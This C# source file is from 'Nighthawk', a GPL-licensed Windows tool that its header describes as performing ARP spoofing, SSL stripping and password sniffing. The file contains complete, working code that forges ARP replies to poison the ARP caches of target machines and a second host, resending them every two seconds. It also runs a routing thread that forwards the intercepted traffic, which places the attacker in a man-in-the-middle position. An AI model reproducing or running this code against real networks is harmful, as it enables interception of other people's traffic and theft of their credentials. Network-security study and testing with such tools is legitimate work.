using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.NetworkInformation;
using System.Text;
using System.Net;
using System.Threading;
using SharpPcap;
using SharpPcap.WinPcap;
using PacketDotNet;

/**
Nighthawk - ARP spoofing, simple SSL stripping and password sniffing for Windows
Copyright (C) 2010  Klemen Bratec

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
**/
namespace Nighthawk
{
    /* ARP network scan & ARP spoofing */
    public class ARPTools
    {
        // current device
        private WinPcapDevice device;

        // status
        public bool SpoofingStarted = false;

        // packet queues (packet store for BG thread to work on)
        public List<ARPPacket> PacketQueue = new List<ARPPacket>();
        private List<ARPPacket> threadQueue = new List<ARPPacket>();

        public List<Packet> PacketQueueRouting = new List<Packet>();
        private List<Packet> threadQueueRouting = new List<Packet>();

        // spoofing data
        public List<Target> SpoofingTargets1;
        public Dictionary<string, PhysicalAddress> IPtoMACTargets1;
        public Target SpoofingTarget2;

        // worker thread
        private Thread workerSender;
        private Thread workerRouter;

        private DeviceInfo deviceInfo;

        // constructor
        public ARPTools(DeviceInfo deviceInfo)
        {
            // store our network interface
            this.device = deviceInfo.Device;
            this.deviceInfo = deviceInfo;
        }

        // start spoofing
        public void StartSpoofing(List<Target> targets1, Target target2)
        {
            // set targets
            SpoofingTargets1 = targets1;
            SpoofingTarget2 = target2;

            // create a new IP - MAC dictionary
            IPtoMACTargets1 = new Dictionary<string, PhysicalAddress>();
            SpoofingTargets1.ForEach(delegate(Target t) { IPtoMACTargets1.Add(t.IP, t.PMAC); });
            
            // add our own computer to targets - used for routing
            IPtoMACTargets1.Add(deviceInfo.IP, deviceInfo.PMAC);
            
            // change status
            SpoofingStarted = true;

            // clear packet caches
            PacketQueue.Clear();

            // create ARP sender worker
            workerSender = new Thread(new ThreadStart(WorkerSender));
            workerSender.Name = "ARP sender thread";
            workerSender.Start();

            // create ARP router worker
            workerRouter = new Thread(new ThreadStart(WorkerRouter));
            workerRouter.Name = "Router thread";
            workerRouter.Start();
        }

        // stop spoofing
        public void StopSpoofing()
        {
            SpoofingStarted = false;

            // stop threads & re-ARP
            ReArpTargets();
            workerSender.Join();
            workerRouter.Join();
            ReArpTargets();

            threadQueue.Clear();
            threadQueueRouting.Clear();

            PacketQueue.Clear();
            PacketQueueRouting.Clear();
        }

        // create ARP replay packet - source MAC to device MAC
        private EthernetPacket GenerateARPReply(string senderIP, string targetIP, PhysicalAddress targetMAC)
        {
            return GenerateARPReply(senderIP, targetIP, targetMAC, deviceInfo.PMAC);
        }

        // create ARP replay packet
        private EthernetPacket GenerateARPReply(string senderIP, string targetIP, PhysicalAddress targetMAC, PhysicalAddress sourceMAC)
        {
            // generate ethernet part - layer 1
            var ethernetPacket = new EthernetPacket(deviceInfo.PMAC, targetMAC,
                                                    EthernetPacketType.Arp);

            // arp data - layer 2
            var arpPacket = new ARPPacket(ARPOperation.Response, targetMAC, IPAddress.Parse(targetIP), sourceMAC,
                                       IPAddress.Parse(senderIP));

            ethernetPacket.PayloadPacket = arpPacket;

            return ethernetPacket;
        }

        // send correct ARP entries back to targets
        private void ReArpTargets()
        {
            foreach (Target target1 in SpoofingTargets1)
            {
                device.SendPacket(GenerateARPReply(target1.IP, SpoofingTarget2.IP, SpoofingTarget2.PMAC, target1.PMAC));
            }

            foreach (Target target1 in SpoofingTargets1)
            {
                device.SendPacket(GenerateARPReply(SpoofingTarget2.IP, target1.IP, target1.PMAC, SpoofingTarget2.PMAC));
            }
        }

        // worker function that sends ARP packets
        public void WorkerSender()
        {
            // loop
            while (SpoofingStarted)
            {
                // one way...
                foreach (Target target1 in SpoofingTargets1)
                {
                    device.SendPacket(GenerateARPReply(target1.IP, SpoofingTarget2.IP, SpoofingTarget2.PMAC));
                }

                // ...and another
                foreach (Target target1 in SpoofingTargets1)
                {
                    device.SendPacket(GenerateARPReply(SpoofingTarget2.IP, target1.IP, target1.PMAC));
                }

                Thread.Sleep(2000);
            }

            return;
        }

        // worker function for routing packets
        public void WorkerRouter()
        {
            // loop
            while (SpoofingStarted)
            {
                // copy packets to threadRoutingQueue
                lock (PacketQueueRouting)
                {
                    foreach (Packet packet in PacketQueueRouting)
                    {
                        threadQueueRouting.Add(packet);
                    }

                    PacketQueueRouting.Clear();
                }

                // check for pending packets
                if (threadQueueRouting.Count > 0)
                {
                    // loop through packets and re-send them
                    foreach (Packet packet in threadQueueRouting)
                    {
                        if (packet == null) continue;

                        var ip = (packet is IpPacket ? (IpPacket)packet : IpPacket.GetEncapsulated(packet));

                        var sourceIP = ip.SourceAddress.ToString();
                        var destinationIP = ip.DestinationAddress.ToString();

                        var ethernetPacket = (packet as EthernetPacket);
                        
                        // incoming packets)
                        if (IPtoMACTargets1.ContainsKey(destinationIP) && ethernetPacket.DestinationHwAddress.ToString() != IPtoMACTargets1[destinationIP].ToString())
                        {
                            // set real MAC
                            ethernetPacket.SourceHwAddress = deviceInfo.PMAC;
                            ethernetPacket.DestinationHwAddress = IPtoMACTargets1[destinationIP];

                            try
                            {
                                device.SendPacket(packet);
                            }
                            catch { }
                        }

                        // outgoing packets
                        if (IPtoMACTargets1.ContainsKey(sourceIP) && ethernetPacket.DestinationHwAddress.ToString() != SpoofingTarget2.PMAC.ToString())
                        {
                            // set real MAC
                            ethernetPacket.SourceHwAddress = deviceInfo.PMAC;
                            ethernetPacket.DestinationHwAddress = SpoofingTarget2.PMAC;

                            try 
                            {
                                device.SendPacket(packet);
                            }
                            catch { }
                        }
                    }

                    threadQueueRouting.Clear();
                }
                else
                {
                    Thread.Sleep(50);
                }
            }

            return;
        }
    }
}
